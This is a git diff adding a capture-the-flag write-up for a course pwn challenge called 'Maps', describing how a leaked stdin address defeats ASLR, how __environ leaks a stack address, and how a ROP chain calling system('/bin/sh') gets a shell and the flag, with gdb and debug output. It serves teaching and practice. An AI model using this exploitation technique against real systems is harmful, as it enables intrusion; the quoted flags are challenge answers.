@@ -244,3 +244,114 @@ $ cat flag.txt
     b'flag{th4t_w4s_r0pp1ng_b3f0r3_gl1bc_2.34!_ae1228fe5a2871f0}\n'
 flag{th4t_w4s_r0pp1ng_b3f0r3_gl1bc_2.34!_ae1228fe5a2871f0}
 ```
+
+## Challenge - Maps
+```
+This is a very kind Maps App! It will help you find a nice place to store your stuff!
+
+nc offsec-chalbroker.osiris.cyber.nyu.edu 1205
+```
+
+Libc is provided for this one. 
+
+```aiignore
+7$ checksec maps
+[*] '/mnt/csgy9223_IntroOffSec/week_7/maps'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+Running the binary:
+```aiignore
+ ./maps
+Welcome to the Free Maps App!
+As a new customer, you get one hint for free: ����
+
+Where do you want to go?
+Home
+Segmentation fault
+```
+
+They are passing some data to us after "free: ". Going to binja.
+
+They are providing the address of stdin in the text. And it looks like that entry is used as some sort of address.
+
+Looks like we need to use the stdin address to compute the base address. Let's see if this works:
+
+As a test used the address of stdin to compute a base address. Using 
+
+```
+stdin_offset = libc_elf.symbols._IO_2_1_stdin_
+base_address = stdin_address - stdin_offset```
+```
+I computed the base address and now have:
+
+```
+stdin address: 0x7ffff7fa48e0
+Libc base address: 0x7ffff7da1000
+system address: 0x7ffff7df9750
+Found /bin/sh at 0x7ffff7f6c42f
+```
+Using gdb to see if these are correct:
+```aiignore
+x/s 0x7ffff7f6c42f
+[DEBUG] Received 0x1e bytes:
+0x7ffff7f6c42f: "/bin/sh"
+```
+Good, we now have broken ASLR.
+
+Next, it from my experimenting, I need to get the stack address for the input variable we want to overflow. I'll use the symbol for "__environ" to get this address.
+
+```aiignore
+$ readelf -Ws libc.so.6 | grep __environ
+   724: 0000000000222200     8 OBJECT  GLOBAL DEFAULT   35 __environ@@GLIBC_2.2.5
+```
+Using this code snippet, I send the address of the environ to get the address where the environ is in memory, and the plan is to use this to compute the address in the stack:
+
+```aiignore
+environ_address = libc_elf.symbols.__environ + base_address
+print(f'Address of environ: {hex(environ_address)}')
+p.send(p64(environ_address))
+address_of_envvars = int(p.recvline().strip(), 16)
+
+Address of envvars: 0x7fffffffddd8 
+```
+
+Looking at the stack, it appears as though the beginning of the stack is at address 0x00007fffffffdc90 and is -x148 bytes off of the environ space. Since my target variable is -0x18 bytes from this I'll compute my target address to be:
+
+```aiignore
+0x7fffffffddd8 - 0x00007fffffffdc90 + 0x10
+```
+
+Because there is a canary check, we need to skip overwriting the RPB and go straight to the RIP.
+
+Plan of attack:
+- Get base address using address of stdin
+- Get get the stack address
+- Send in the stack address plus the offset to the RIP
+- Send in a rop chain that starts with two ret gadgets, followed by an rdi gadget, bin/sh and the system call
+
+While locally this worked for me, on the remote server the offset between env and the stack were different due to different versions of libc. On the remote server I was hitting the canary and getting a "stack smashing" error. By adding 0x10 bytes to my original value I got the flag:
+
+```aiignore
+$ ls
+[DEBUG] Sent 0x3 bytes:
+    b'ls\n'
+[DEBUG] Received 0xe bytes:
+    b'flag.txt\n'
+    b'maps\n'
+flag.txt
+maps
+$ cat flag.txt
+[DEBUG] Sent 0xd bytes:
+    b'cat flag.txt\n'
+[DEBUG] Received 0x32 bytes:
+    b'flag{th4t_w4s_s0m3_fun_r0pp1ng!_0513409d87a9c7ab}\n'
+flag{th4t_w4s_s0m3_fun_r0pp1ng!_0513409d87a9c7ab}
+```
